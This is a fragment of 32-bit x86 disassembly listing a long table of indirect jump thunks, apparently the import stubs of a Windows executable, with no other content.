  41c3ae:	jmp    DWORD PTR ds:0x41dc2c
  41c3b4:	jmp    DWORD PTR ds:0x41dc30
  41c3ba:	jmp    DWORD PTR ds:0x41dc34
  41c3c0:	jmp    DWORD PTR ds:0x41dc38
  41c3c6:	jmp    DWORD PTR ds:0x41dc3c
  41c3cc:	jmp    DWORD PTR ds:0x41dc40
  41c3d2:	jmp    DWORD PTR ds:0x41dc44
  41c3d8:	jmp    DWORD PTR ds:0x41dc48
  41c3de:	jmp    DWORD PTR ds:0x41dc4c
  41c3e4:	jmp    DWORD PTR ds:0x41dc50
  41c3ea:	jmp    DWORD PTR ds:0x41dc54
  41c3f0:	jmp    DWORD PTR ds:0x41dc58
  41c3f6:	jmp    DWORD PTR ds:0x41dc5c
  41c3fc:	jmp    DWORD PTR ds:0x41dc60
  41c402:	jmp    DWORD PTR ds:0x41dc64
  41c408:	jmp    DWORD PTR ds:0x41dc68
  41c40e:	jmp    DWORD PTR ds:0x41dc6c
  41c414:	jmp    DWORD PTR ds:0x41dc70
  41c41a:	jmp    DWORD PTR ds:0x41dc74
  41c420:	jmp    DWORD PTR ds:0x41dc78
  41c426:	jmp    DWORD PTR ds:0x41dc7c
  41c42c:	jmp    DWORD PTR ds:0x41dc80
  41c432:	jmp    DWORD PTR ds:0x41dc84
  41c438:	jmp    DWORD PTR ds:0x41dc88
  41c43e:	jmp    DWORD PTR ds:0x41dc8c
  41c444:	jmp    DWORD PTR ds:0x41dc90
  41c44a:	jmp    DWORD PTR ds:0x41dc94
  41c450:	jmp    DWORD PTR ds:0x41dc98
  41c456:	jmp    DWORD PTR ds:0x41dc9c
  41c45c:	jmp    DWORD PTR ds:0x41dca0
  41c462:	jmp    DWORD PTR ds:0x41dca4
  41c468:	jmp    DWORD PTR ds:0x41dca8
  41c46e:	jmp    DWORD PTR ds:0x41dcac
  41c474:	jmp    DWORD PTR ds:0x41dcb0
  41c47a:	jmp    DWORD PTR ds:0x41dcb4
  41c480:	jmp    DWORD PTR ds:0x41dcb8
  41c486:	jmp    DWORD PTR ds:0x41dcbc
  41c48c:	jmp    DWORD PTR ds:0x41dcc0
  41c492:	jmp    DWORD PTR ds:0x41dcc4
  41c498:	jmp    DWORD PTR ds:0x41dcc8
  41c49e:	jmp    DWORD PTR ds:0x41dccc
  41c4a4:	jmp    DWORD PTR ds:0x41dcd0
  41c4aa:	jmp    DWORD PTR ds:0x41dcd4
  41c4b0:	jmp    DWORD PTR ds:0x41dcd8
  41c4b6:	jmp    DWORD PTR ds:0x41dcdc
  41c4bc:	jmp    DWORD PTR ds:0x41dce0
  41c4c2:	jmp    DWORD PTR ds:0x41dce4
  41c4c8:	jmp    DWORD PTR ds:0x41dce8
  41c4ce:	jmp    DWORD PTR ds:0x41dcec
  41c4d4:	jmp    DWORD PTR ds:0x41dcf0
  41c4da:	jmp    DWORD PTR ds:0x41dcf4
  41c4e0:	jmp    DWORD PTR ds:0x41dcf8
  41c4e6:	jmp    DWORD PTR ds:0x41dcfc
  41c4ec:	jmp    DWORD PTR ds:0x41dd00
  41c4f2:	jmp    DWORD PTR ds:0x41dd08
  41c4f8:	jmp    DWORD PTR ds:0x41dd0c
  41c4fe:	jmp    DWORD PTR ds:0x41dd10
  41c504:	jmp    DWORD PTR ds:0x41dd14
  41c50a:	jmp    DWORD PTR ds:0x41dd18
  41c510:	jmp    DWORD PTR ds:0x41dd1c
  41c516:	jmp    DWORD PTR ds:0x41dd20
  41c51c:	jmp    DWORD PTR ds:0x41dd24
  41c522:	jmp    DWORD PTR ds:0x41dd28
  41c528:	jmp    DWORD PTR ds:0x41dd2c
  41c52e:	jmp    DWORD PTR ds:0x41dd30
  41c534:	jmp    DWORD PTR ds:0x41dd34
  41c53a:	jmp    DWORD PTR ds:0x41dd38
  41c540:	jmp    DWORD PTR ds:0x41dd3c
  41c546:	jmp    DWORD PTR ds:0x41dd40
  41c54c:	jmp    DWORD PTR ds:0x41dd44
  41c552:	jmp    DWORD PTR ds:0x41dd48
  41c558:	jmp    DWORD PTR ds:0x41dd4c
  41c55e:	jmp    DWORD PTR ds:0x41dd50
  41c564:	jmp    DWORD PTR ds:0x41dd54
  41c56a:	jmp    DWORD PTR ds:0x41dd58
  41c570:	jmp    DWORD PTR ds:0x41dd5c
  41c576:	jmp    DWORD PTR ds:0x41dd60
  41c57c:	jmp    DWORD PTR ds:0x41dd64
  41c582:	jmp    DWORD PTR ds:0x41dd68
  41c588:	jmp    DWORD PTR ds:0x41dd6c
  41c58e:	jmp    DWORD PTR ds:0x41dd70
  41c594:	jmp    DWORD PTR ds:0x41dd74
  41c59a:	jmp    DWORD PTR ds:0x41dd78
  41c5a0:	jmp    DWORD PTR ds:0x41dd7c
  41c5a6:	jmp    DWORD PTR ds:0x41dd80
  41c5ac:	jmp    DWORD PTR ds:0x41dd84
  41c5b2:	jmp    DWORD PTR ds:0x41dd88
  41c5b8:	jmp    DWORD PTR ds:0x41dd8c
  41c5be:	jmp    DWORD PTR ds:0x41dd90
  41c5c4:	jmp    DWORD PTR ds:0x41dd94
  41c5ca:	jmp    DWORD PTR ds:0x41dd98
  41c5d0:	jmp    DWORD PTR ds:0x41dd9c
  41c5d6:	jmp    DWORD PTR ds:0x41dda0
  41c5dc:	jmp    DWORD PTR ds:0x41dda4
  41c5e2:	jmp    DWORD PTR ds:0x41dda8
  41c5e8:	jmp    DWORD PTR ds:0x41ddac
  41c5ee:	jmp    DWORD PTR ds:0x41ddb0
  41c5f4:	jmp    DWORD PTR ds:0x41ddb4
  41c5fa:	jmp    DWORD PTR ds:0x41ddb8
  41c600:	jmp    DWORD PTR ds:0x41ddbc
  41c606:	jmp    DWORD PTR ds:0x41ddc0
  41c60c:	jmp    DWORD PTR ds:0x41ddc4
  41c612:	jmp    DWORD PTR ds:0x41ddc8
  41c618:	jmp    DWORD PTR ds:0x41ddcc
  41c61e:	jmp    DWORD PTR ds:0x41ddd0
  41c624:	jmp    DWORD PTR ds:0x41ddd4
  41c62a:	jmp    DWORD PTR ds:0x41ddd8
  41c630:	jmp    DWORD PTR ds:0x41dddc
  41c636:	jmp    DWORD PTR ds:0x41dde0
  41c63c:	jmp    DWORD PTR ds:0x41dde4
  41c642:	jmp    DWORD PTR ds:0x41dde8
  41c648:	jmp    DWORD PTR ds:0x41ddec
  41c64e:	jmp    DWORD PTR ds:0x41ddf0
  41c654:	jmp    DWORD PTR ds:0x41ddf4
  41c65a:	jmp    DWORD PTR ds:0x41ddf8
  41c660:	jmp    DWORD PTR ds:0x41ddfc
  41c666:	jmp    DWORD PTR ds:0x41de00
  41c66c:	jmp    DWORD PTR ds:0x41de04
  41c672:	jmp    DWORD PTR ds:0x41de08
  41c678:	jmp    DWORD PTR ds:0x41de0c
  41c67e:	jmp    DWORD PTR ds:0x41de10
  41c684:	jmp    DWORD PTR ds:0x41de14
  41c68a:	jmp    DWORD PTR ds:0x41de18
  41c690:	jmp    DWORD PTR ds:0x41de1c
  41c696:	jmp    DWORD PTR ds:0x41de20
  41c69c:	jmp    DWORD PTR ds:0x41de24
  41c6a2:	jmp    DWORD PTR ds:0x41de28
  41c6a8:	jmp    DWORD PTR ds:0x41de2c
  41c6ae:	jmp    DWORD PTR ds:0x41de30
  41c6b4:	jmp    DWORD PTR ds:0x41de34
  41c6ba:	jmp    DWORD PTR ds:0x41de38
  41c6c0:	jmp    DWORD PTR ds:0x41de3c
  41c6c6:	jmp    DWORD PTR ds:0x41de40
  41c6cc:	jmp    DWORD PTR ds:0x41de44
  41c6d2:	jmp    DWORD PTR ds:0x41de48
  41c6d8:	jmp    DWORD PTR ds:0x41de4c
  41c6de:	jmp    DWORD PTR ds:0x41de50
  41c6e4:	jmp    DWORD PTR ds:0x41de54
  41c6ea:	jmp    DWORD PTR ds:0x41de58
  41c6f0:	jmp    DWORD PTR ds:0x41de5c
  41c6f6:	jmp    DWORD PTR ds:0x41de60
  41c6fc:	jmp    DWORD PTR ds:0x41de64
  41c702:	jmp    DWORD PTR ds:0x41de68
  41c708:	jmp    DWORD PTR ds:0x41de6c
  41c70e:	jmp    DWORD PTR ds:0x41de70
  41c714:	jmp    DWORD PTR ds:0x41de74
  41c71a:	jmp    DWORD PTR ds:0x41de78
  41c720:	jmp    DWORD PTR ds:0x41de7c
  41c726:	jmp    DWORD PTR ds:0x41de80
  41c72c:	jmp    DWORD PTR ds:0x41de84
  41c732:	jmp    DWORD PTR ds:0x41de88
  41c738:	jmp    DWORD PTR ds:0x41de8c
  41c73e:	jmp    DWORD PTR ds:0x41de90
  41c744:	jmp    DWORD PTR ds:0x41de94
  41c74a:	jmp    DWORD PTR ds:0x41de98
  41c750:	jmp    DWORD PTR ds:0x41de9c
  41c756:	jmp    DWORD PTR ds:0x41dea0
  41c75c:	jmp    DWORD PTR ds:0x41dea4
  41c762:	jmp    DWORD PTR ds:0x41dea8
  41c768:	jmp    DWORD PTR ds:0x41deac
  41c76e:	jmp    DWORD PTR ds:0x41deb0
  41c774:	jmp    DWORD PTR ds:0x41deb4
  41c77a:	jmp    DWORD PTR ds:0x41deb8
  41c780:	jmp    DWORD PTR ds:0x41debc
  41c786:	jmp    DWORD PTR ds:0x41dec0
  41c78c:	jmp    DWORD PTR ds:0x41dec4
  41c792:	jmp    DWORD PTR ds:0x41dec8
  41c798:	jmp    DWORD PTR ds:0x41decc
  41c79e:	jmp    DWORD PTR ds:0x41ded0
  41c7a4:	jmp    DWORD PTR ds:0x41ded4
  41c7aa:	jmp    DWORD PTR ds:0x41ded8
  41c7b0:	jmp    DWORD PTR ds:0x41dedc
  41c7b6:	jmp    DWORD PTR ds:0x41dee0
  41c7bc:	jmp    DWORD PTR ds:0x41dee4
  41c7c2:	jmp    DWORD PTR ds:0x41dee8
  41c7c8:	jmp    DWORD PTR ds:0x41deec
  41c7ce:	jmp    DWORD PTR ds:0x41def0
  41c7d4:	jmp    DWORD PTR ds:0x41def4
  41c7da:	jmp    DWORD PTR ds:0x41def8
  41c7e0:	jmp    DWORD PTR ds:0x41defc
  41c7e6:	jmp    DWORD PTR ds:0x41df00
  41c7ec:	jmp    DWORD PTR ds:0x41df04
  41c7f2:	jmp    DWORD PTR ds:0x41df08
  41c7f8:	jmp    DWORD PTR ds:0x41df0c
  41c7fe:	jmp    DWORD PTR ds:0x41df10
  41c804:	jmp    DWORD PTR ds:0x41df14
  41c80a:	jmp    DWORD PTR ds:0x41df18
  41c810:	jmp    DWORD PTR ds:0x41df1c
  41c816:	jmp    DWORD PTR ds:0x41df20
  41c81c:	jmp    DWORD PTR ds:0x41df24
  41c822:	jmp    DWORD PTR ds:0x41df28
  41c828:	jmp    DWORD PTR ds:0x41df2c
  41c82e:	jmp    DWORD PTR ds:0x41df30
  41c834:	jmp    DWORD PTR ds:0x41df34
  41c83a:	jmp    DWORD PTR ds:0x41df38
  41c840:	jmp    DWORD PTR ds:0x41df3c
  41c846:	jmp    DWORD PTR ds:0x41df40
  41c84c:	jmp    DWORD PTR ds:0x41df44
  41c852:	jmp    DWORD PTR ds:0x41df48
  41c858:	jmp    DWORD PTR ds:0x41df4c
  41c85e:	jmp    DWORD PTR ds:0x41df50
  41c864:	jmp    DWORD PTR ds:0x41df54
  41c86a:	jmp    DWORD PTR ds:0x41df58
  41c870:	jmp    DWORD PTR ds:0x41df5c
  41c876:	jmp    DWORD PTR ds:0x41df60
  41c87c:	jmp    DWORD PTR ds:0x41df64
  41c882:	jmp    DWORD PTR ds:0x41df68
  41c888:	jmp    DWORD PTR ds:0x41df6c
  41c88e:	jmp    DWORD PTR ds:0x41df70
  41c894:	jmp    DWORD PTR ds:0x41df74
  41c89a:	jmp    DWORD PTR ds:0x41df78
  41c8a0:	jmp    DWORD PTR ds:0x41df7c
  41c8a6:	jmp    DWORD PTR ds:0x41df80
  41c8ac:	jmp    DWORD PTR ds:0x41df84
  41c8b2:	jmp    DWORD PTR ds:0x41df88
  41c8b8:	jmp    DWORD PTR ds:0x41df8c
  41c8be:	jmp    DWORD PTR ds:0x41df90
  41c8c4:	jmp    DWORD PTR ds:0x41df94
  41c8ca:	jmp    DWORD PTR ds:0x41df98
  41c8d0:	jmp    DWORD PTR ds:0x41df9c
  41c8d6:	jmp    DWORD PTR ds:0x41dfa0
  41c8dc:	jmp    DWORD PTR ds:0x41dfa4
  41c8e2:	jmp    DWORD PTR ds:0x41dfa8
  41c8e8:	jmp    DWORD PTR ds:0x41dfac
  41c8ee:	jmp    DWORD PTR ds:0x41dfb0
  41c8f4:	jmp    DWORD PTR ds:0x41dfb4
  41c8fa:	jmp    DWORD PTR ds:0x41dfb8
  41c900:	jmp    DWORD PTR ds:0x41dfbc
  41c906:	jmp    DWORD PTR ds:0x41dfc0
  41c90c:	jmp    DWORD PTR ds:0x41dfc4
  41c912:	jmp    DWORD PTR ds:0x41dfc8
  41c918:	jmp    DWORD PTR ds:0x41dfcc
  41c91e:	jmp    DWORD PTR ds:0x41dfd0
  41c924:	jmp    DWORD PTR ds:0x41dfd4
  41c92a:	jmp    DWORD PTR ds:0x41dfd8
  41c930:	jmp    DWORD PTR ds:0x41dfdc
  41c936:	jmp    DWORD PTR ds:0x41dfe0
  41c93c:	jmp    DWORD PTR ds:0x41dfe4
  41c942:	jmp    DWORD PTR ds:0x41dfe8
  41c948:	jmp    DWORD PTR ds:0x41dfec
  41c94e:	jmp    DWORD PTR ds:0x41dff0
  41c954:	jmp    DWORD PTR ds:0x41dff4
  41c95a:	jmp    DWORD PTR ds:0x41dff8
  41c960:	jmp    DWORD PTR ds:0x41dffc
  41c966:	jmp    DWORD PTR ds:0x41e000
  41c96c:	jmp    DWORD PTR ds:0x41e004
  41c972:	jmp    DWORD PTR ds:0x41e008
  41c978:	jmp    DWORD PTR ds:0x41e00c
  41c97e:	jmp    DWORD PTR ds:0x41e010
  41c984:	jmp    DWORD PTR ds:0x41e014
  41c98a:	jmp    DWORD PTR ds:0x41e018
  41c990:	jmp    DWORD PTR ds:0x41e01c
  41c996:	jmp    DWORD PTR ds:0x41e020
  41c99c:	jmp    DWORD PTR ds:0x41e024
  41c9a2:	jmp    DWORD PTR ds:0x41e028
  41c9a8:	jmp    DWORD PTR ds:0x41e02c
  41c9ae:	jmp    DWORD PTR ds:0x41e030
  41c9b4:	jmp    DWORD PTR ds:0x41e034
  41c9ba:	jmp    DWORD PTR ds:0x41e038
  41c9c0:	jmp    DWORD PTR ds:0x41e03c
  41c9c6:	jmp    DWORD PTR ds:0x41e040
  41c9cc:	jmp    DWORD PTR ds:0x41e044
  41c9d2:	jmp    DWORD PTR ds:0x41e048
  41c9d8:	jmp    DWORD PTR ds:0x41e04c
  41c9de:	jmp    DWORD PTR ds:0x41e050
  41c9e4:	jmp    DWORD PTR ds:0x41e054
  41c9ea:	jmp    DWORD PTR ds:0x41e058
  41c9f0:	jmp    DWORD PTR ds:0x41e05c
  41c9f6:	jmp    DWORD PTR ds:0x41e060
  41c9fc:	jmp    DWORD PTR ds:0x41e064
  41ca02:	jmp    DWORD PTR ds:0x41e068
  41ca08:	jmp    DWORD PTR ds:0x41e06c
  41ca0e:	jmp    DWORD PTR ds:0x41e070
  41ca14:	jmp    DWORD PTR ds:0x41e074
  41ca1a:	jmp    DWORD PTR ds:0x41e078
  41ca20:	jmp    DWORD PTR ds:0x41e07c
  41ca26:	jmp    DWORD PTR ds:0x41e080
  41ca2c:	jmp    DWORD PTR ds:0x41e084
  41ca32:	jmp    DWORD PTR ds:0x41e088
  41ca38:	jmp    DWORD PTR ds:0x41e08c
  41ca3e:	jmp    DWORD PTR ds:0x41e090
  41ca44:	jmp    DWORD PTR ds:0x41e094
  41ca4a:	jmp    DWORD PTR ds:0x41e098
  41ca50:	jmp    DWORD PTR ds:0x41e09c
  41ca56:	jmp    DWORD PTR ds:0x41e0a0
  41ca5c:	jmp    DWORD PTR ds:0x41e0a4
  41ca62:	jmp    DWORD PTR ds:0x41e0a8
  41ca68:	jmp    DWORD PTR ds:0x41e0ac
  41ca6e:	jmp    DWORD PTR ds:0x41e0b0
  41ca74:	jmp    DWORD PTR ds:0x41e0b4
  41ca7a:	jmp    DWORD PTR ds:0x41e0b8
  41ca80:	jmp    DWORD PTR ds:0x41e0bc
  41ca86:	jmp    DWORD PTR ds:0x41e0c0
  41ca8c:	jmp    DWORD PTR ds:0x41e0c4
  41ca92:	jmp    DWORD PTR ds:0x41e0c8
  41ca98:	jmp    DWORD PTR ds:0x41e0cc
  41ca9e:	jmp    DWORD PTR ds:0x41e0d0
  41caa4:	jmp    DWORD PTR ds:0x41e0d4
  41caaa:	jmp    DWORD PTR ds:0x41e0d8
  41cab0:	jmp    DWORD PTR ds:0x41e0dc
  41cab6:	jmp    DWORD PTR ds:0x41e0e4
  41cabc:	jmp    DWORD PTR ds:0x41e0ec
  41cac2:	jmp    DWORD PTR ds:0x41e0f0
  41cac8:	jmp    DWORD PTR ds:0x41e0f4
  41cace:	jmp    DWORD PTR ds:0x41e0f8
  41cad4:	jmp    DWORD PTR ds:0x41e0fc
  41cada:	jmp    DWORD PTR ds:0x41e100
  41cae0:	jmp    DWORD PTR ds:0x41e104
  41cae6:	jmp    DWORD PTR ds:0x41e108
  41caec:	jmp    DWORD PTR ds:0x41e10c
  41caf2:	jmp    DWORD PTR ds:0x41e110
  41caf8:	jmp    DWORD PTR ds:0x41e114
  41cafe:	jmp    DWORD PTR ds:0x41e118
  41cb04:	jmp    DWORD PTR ds:0x41e11c
  41cb0a:	jmp    DWORD PTR ds:0x41e120
  41cb10:	jmp    DWORD PTR ds:0x41e124
  41cb16:	jmp    DWORD PTR ds:0x41e128
  41cb1c:	jmp    DWORD PTR ds:0x41e12c
  41cb22:	jmp    DWORD PTR ds:0x41e130
  41cb28:	jmp    DWORD PTR ds:0x41e134
  41cb2e:	jmp    DWORD PTR ds:0x41e138
  41cb34:	jmp    DWORD PTR ds:0x41e13c
  41cb3a:	jmp    DWORD PTR ds:0x41e140
  41cb40:	jmp    DWORD PTR ds:0x41e144
  41cb46:	jmp    DWORD PTR ds:0x41e148
  41cb4c:	jmp    DWORD PTR ds:0x41e14c
  41cb52:	jmp    DWORD PTR ds:0x41e150
  41cb58:	jmp    DWORD PTR ds:0x41e154
  41cb5e:	jmp    DWORD PTR ds:0x41e158
  41cb64:	jmp    DWORD PTR ds:0x41e15c
  41cb6a:	jmp    DWORD PTR ds:0x41e160
  41cb70:	jmp    DWORD PTR ds:0x41e164
  41cb76:	jmp    DWORD PTR ds:0x41e168
  41cb7c:	jmp    DWORD PTR ds:0x41e16c
  41cb82:	jmp    DWORD PTR ds:0x41e170
  41cb88:	jmp    DWORD PTR ds:0x41e174
  41cb8e:	jmp    DWORD PTR ds:0x41e178
  41cb94:	jmp    DWORD PTR ds:0x41e17c
  41cb9a:	jmp    DWORD PTR ds:0x41e180
  41cba0:	jmp    DWORD PTR ds:0x41e184
  41cba6:	jmp    DWORD PTR ds:0x41e188
  41cbac:	jmp    DWORD PTR ds:0x41e18c
  41cbb2:	jmp    DWORD PTR ds:0x41e190
  41cbb8:	jmp    DWORD PTR ds:0x41e194
  41cbbe:	jmp    DWORD PTR ds:0x41e198
  41cbc4:	jmp    DWORD PTR ds:0x41e19c
  41cbca:	jmp    DWORD PTR ds:0x41e1a0
  41cbd0:	jmp    DWORD PTR ds:0x41e1a4
  41cbd6:	jmp    DWORD PTR ds:0x41e1a8
  41cbdc:	jmp    DWORD PTR ds:0x41e1ac
  41cbe2:	jmp    DWORD PTR ds:0x41e1b0
  41cbe8:	jmp    DWORD PTR ds:0x41e1b4
  41cbee:	jmp    DWORD PTR ds:0x41e1b8
  41cbf4:	jmp    DWORD PTR ds:0x41e1bc
  41cbfa:	jmp    DWORD PTR ds:0x41e1c0
  41cc00:	jmp    DWORD PTR ds:0x41e1c4
  41cc06:	jmp    DWORD PTR ds:0x41e1c8
  41cc0c:	jmp    DWORD PTR ds:0x41e1cc
  41cc12:	jmp    DWORD PTR ds:0x41e1d0
  41cc18:	jmp    DWORD PTR ds:0x41e1d4
  41cc1e:	jmp    DWORD PTR ds:0x41e1d8
  41cc24:	jmp    DWORD PTR ds:0x41e1dc
  41cc2a:	jmp    DWORD PTR ds:0x41e1e0
  41cc30:	jmp    DWORD PTR ds:0x41e1e4
  41cc36:	jmp    DWORD PTR ds:0x41e1e8
  41cc3c:	jmp    DWORD PTR ds:0x41e1ec
  41cc42:	jmp    DWORD PTR ds:0x41e1f0
  41cc48:	jmp    DWORD PTR ds:0x41e1f4
  41cc4e:	jmp    DWORD PTR ds:0x41e1f8
  41cc54:	jmp    DWORD PTR ds:0x41e1fc
  41cc5a:	jmp    DWORD PTR ds:0x41e200
  41cc60:	jmp    DWORD PTR ds:0x41e204
  41cc66:	jmp    DWORD PTR ds:0x41e208
  41cc6c:	jmp    DWORD PTR ds:0x41e20c
  41cc72:	jmp    DWORD PTR ds:0x41e210
  41cc78:	jmp    DWORD PTR ds:0x41e214
  41cc7e:	jmp    DWORD PTR ds:0x41e218
  41cc84:	jmp    DWORD PTR ds:0x41e21c
  41cc8a:	jmp    DWORD PTR ds:0x41e220
  41cc90:	jmp    DWORD PTR ds:0x41e224
  41cc96:	jmp    DWORD PTR ds:0x41e228
  41cc9c:	jmp    DWORD PTR ds:0x41e22c
  41cca2:	jmp    DWORD PTR ds:0x41e230
  41cca8:	jmp    DWORD PTR ds:0x41e234
  41ccae:	jmp    DWORD PTR ds:0x41e238
  41ccb4:	jmp    DWORD PTR ds:0x41e23c
  41ccba:	jmp    DWORD PTR ds:0x41e240
  41ccc0:	jmp    DWORD PTR ds:0x41e244
  41ccc6:	jmp    DWORD PTR ds:0x41e248
  41cccc:	jmp    DWORD PTR ds:0x41e24c
  41ccd2:	jmp    DWORD PTR ds:0x41e250
  41ccd8:	jmp    DWORD PTR ds:0x41e254
  41ccde:	jmp    DWORD PTR ds:0x41e258
  41cce4:	jmp    DWORD PTR ds:0x41e25c
  41ccea:	jmp    DWORD PTR ds:0x41e260
  41ccf0:	jmp    DWORD PTR ds:0x41e264
  41ccf6:	jmp    DWORD PTR ds:0x41e268
  41ccfc:	jmp    DWORD PTR ds:0x41e26c
  41cd02:	jmp    DWORD PTR ds:0x41e270
  41cd08:	jmp    DWORD PTR ds:0x41e274
  41cd0e:	jmp    DWORD PTR ds:0x41e278
  41cd14:	jmp    DWORD PTR ds:0x41e27c
  41cd1a:	jmp    DWORD PTR ds:0x41e280
  41cd20:	jmp    DWORD PTR ds:0x41e284
  41cd26:	jmp    DWORD PTR ds:0x41e288
  41cd2c:	jmp    DWORD PTR ds:0x41e28c
  41cd32:	jmp    DWORD PTR ds:0x41e290
  41cd38:	jmp    DWORD PTR ds:0x41e294
  41cd3e:	jmp    DWORD PTR ds:0x41e298
  41cd44:	jmp    DWORD PTR ds:0x41e29c
  41cd4a:	jmp    DWORD PTR ds:0x41e2a0
  41cd50:	jmp    DWORD PTR ds:0x41e2a4
  41cd56:	jmp    DWORD PTR ds:0x41e2a8
  41cd5c:	jmp    DWORD PTR ds:0x41e2ac
  41cd62:	jmp    DWORD PTR ds:0x41e2b0
  41cd68:	jmp    DWORD PTR ds:0x41e2b4
  41cd6e:	jmp    DWORD PTR ds:0x41e2b8
  41cd74:	jmp    DWORD PTR ds:0x41e2bc
  41cd7a:	jmp    DWORD PTR ds:0x41e2c0
  41cd80:	jmp    DWORD PTR ds:0x41e2c4
  41cd86:	jmp    DWORD PTR ds:0x41e2c8
  41cd8c:	jmp    DWORD PTR ds:0x41e2cc
  41cd92:	jmp    DWORD PTR ds:0x41e2d0
  41cd98:	jmp    DWORD PTR ds:0x41e2d4
  41cd9e:	jmp    DWORD PTR ds:0x41e2d8
  41cda4:	jmp    DWORD PTR ds:0x41e2dc
  41cdaa:	jmp    DWORD PTR ds:0x41e2e0
  41cdb0:	jmp    DWORD PTR ds:0x41e2e4
  41cdb6:	jmp    DWORD PTR ds:0x41e2e8
  41cdbc:	jmp    DWORD PTR ds:0x41e2ec
  41cdc2:	jmp    DWORD PTR ds:0x41e2f0
  41cdc8:	jmp    DWORD PTR ds:0x41e2f4
  41cdce:	jmp    DWORD PTR ds:0x41e2f8
  41cdd4:	jmp    DWORD PTR ds:0x41e2fc
  41cdda:	jmp    DWORD PTR ds:0x41e300
  41cde0:	jmp    DWORD PTR ds:0x41e304
  41cde6:	jmp    DWORD PTR ds:0x41e308
  41cdec:	jmp    DWORD PTR ds:0x41e30c
  41cdf2:	jmp    DWORD PTR ds:0x41e310
  41cdf8:	jmp    DWORD PTR ds:0x41e314
  41cdfe:	jmp    DWORD PTR ds:0x41e318
  41ce04:	jmp    DWORD PTR ds:0x41e31c
  41ce0a:	jmp    DWORD PTR ds:0x41e320
  41ce10:	jmp    DWORD PTR ds:0x41e324
  41ce16:	jmp    DWORD PTR ds:0x41e328
  41ce1c:	jmp    DWORD PTR ds:0x41e32c
  41ce22:	jmp    DWORD PTR ds:0x41e330
  41ce28:	jmp    DWORD PTR ds:0x41e334
  41ce2e:	jmp    DWORD PTR ds:0x41e338
  41ce34:	jmp    DWORD PTR ds:0x41e33c
  41ce3a:	jmp    DWORD PTR ds:0x41e340
  41ce40:	jmp    DWORD PTR ds:0x41e344
  41ce46:	jmp    DWORD PTR ds:0x41e348
  41ce4c:	jmp    DWORD PTR ds:0x41e34c
  41ce52:	jmp    DWORD PTR ds:0x41e350
  41ce58:	jmp    DWORD PTR ds:0x41e354
  41ce5e:	jmp    DWORD PTR ds:0x41e358
  41ce64:	jmp    DWORD PTR ds:0x41e35c
  41ce6a:	jmp    DWORD PTR ds:0x41e360
  41ce70:	jmp    DWORD PTR ds:0x41e364
  41ce76:	jmp    DWORD PTR ds:0x41e368
  41ce7c:	jmp    DWORD PTR ds:0x41e36c
  41ce82:	jmp    DWORD PTR ds:0x41e370
  41ce88:	jmp    DWORD PTR ds:0x41e374
  41ce8e:	jmp    DWORD PTR ds:0x41e378
  41ce94:	jmp    DWORD PTR ds:0x41e37c
  41ce9a:	jmp    DWORD PTR ds:0x41e380
  41cea0:	jmp    DWORD PTR ds:0x41e384
  41cea6:	jmp    DWORD PTR ds:0x41e388
  41ceac:	jmp    DWORD PTR ds:0x41e38c
  41ceb2:	jmp    DWORD PTR ds:0x41e390
  41ceb8:	jmp    DWORD PTR ds:0x41e394
  41cebe:	jmp    DWORD PTR ds:0x41e398
  41cec4:	jmp    DWORD PTR ds:0x41e39c
  41ceca:	jmp    DWORD PTR ds:0x41e3a0
  41ced0:	jmp    DWORD PTR ds:0x41e3a4
  41ced6:	jmp    DWORD PTR ds:0x41e3a8
  41cedc:	jmp    DWORD PTR ds:0x41e3ac
  41cee2:	jmp    DWORD PTR ds:0x41e3b0
  41cee8:	jmp    DWORD PTR ds:0x41e3b4
  41ceee:	jmp    DWORD PTR ds:0x41e3b8
  41cef4:	jmp    DWORD PTR ds:0x41e3bc
  41cefa:	jmp    DWORD PTR ds:0x41e3c0
  41cf00:	jmp    DWORD PTR ds:0x41e3c4
  41cf06:	jmp    DWORD PTR ds:0x41e3c8
  41cf0c:	jmp    DWORD PTR ds:0x41e3cc
  41cf12:	jmp    DWORD PTR ds:0x41e3d0
  41cf18:	jmp    DWORD PTR ds:0x41e3d4
